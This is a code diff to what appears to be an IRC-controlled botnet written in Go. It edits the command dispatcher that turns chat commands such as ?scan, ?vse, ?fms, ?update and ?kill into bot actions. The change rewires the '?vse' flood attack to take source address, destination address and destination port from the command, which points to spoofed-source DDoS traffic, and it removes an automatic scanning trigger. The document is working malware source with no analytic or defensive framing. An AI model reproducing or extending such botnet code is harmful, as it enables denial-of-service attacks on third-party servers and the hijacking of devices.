@@ -8,7 +8,7 @@ import (
 	"golang.org/x/crypto/ssh"
 )
 
-var BotReader, TopicReader *string
+var BotReader, TopicReader, server *string
 var ChannelTopic []string //Just for a merge process.
 
 /*
@@ -251,7 +251,7 @@ func SetupCaller() (Caller, bool) {
 		}
 		value, key := CALL_4_ARG[SetupComd(3, ":")]
 		return value, key
-	} else if Find(*BotReader, "?scan") {
+	} else if Find(*BotReader, "?scan") || Find(*BotReader, "?vse") {
 		var CALL_3_ARG = map[string]Caller{
 			SetupComd(3, ":"): {
 				CallBot: &Bot{
@@ -261,10 +261,19 @@ func SetupCaller() (Caller, bool) {
 					scanSwitch:  false,
 				},
 			},
+			"?vse": {
+				CallAttack: &Attack{
+					srcAddr:      Recv(*BotReader, 4),
+					dstAddr:      Recv(*BotReader, 5),
+					dstPort:      Recv(*BotReader, 6),
+					attackSwitch: false,
+					reportSwitch: false,
+				},
+			},
 		}
 		value, key := CALL_3_ARG[SetupComd(3, ":")]
 		return value, key
-	} else if Find(*BotReader, "?vse") || Find(*BotReader, "?fms") || Find(*BotReader, "?ipsec") || Find(*BotReader, "?update") {
+	} else if Find(*BotReader, "?fms") || Find(*BotReader, "?ipsec") || Find(*BotReader, "?update") {
 		var CALL_2_ARG = map[string]Caller{
 			SetupComd(3, ":"): {
 				CallAttack: &Attack{
@@ -315,26 +324,6 @@ func SetupCaller() (Caller, bool) {
 		value, key := CALL_NON_ARG[SetupComd(3, ":")]
 		return value, key
 	}
-	/*
-		Specific statement for an auto scanning only!!!
-
-		Find a match command from a topic reciever (a pointer value).
-		Setting up a map key with a self-value.
-	*/
-	if Find(Recv(*TopicReader, 0), "?autoscan") {
-		var CALL_TOPIC_IRC = map[string]Caller{
-			"?autoscan": {
-				CallBot: &Bot{
-					ScanOpt:     Recv(*TopicReader, 1),
-					DefaultArch: Recv(*TopicReader, 2),
-					MipsArch:    Recv(*TopicReader, 3),
-					scanSwitch:  false,
-				},
-			},
-		}
-		value, key := CALL_TOPIC_IRC["?autoscan"]
-		return value, key
-	}
 	return Caller{}, false
 }
 
@@ -351,7 +340,6 @@ func (b *Bot) ExecuteCaller() (func(), bool) {
 		"?jumbo":    b.JUMBO,
 		"?get":      b.GET,
 		"?scan":     b.Scanner,
-		"?autoscan": b.Scanner,
 		"?update":   b.Update,
 		"?info":     b.Information,
 		"?kill":     Kill,
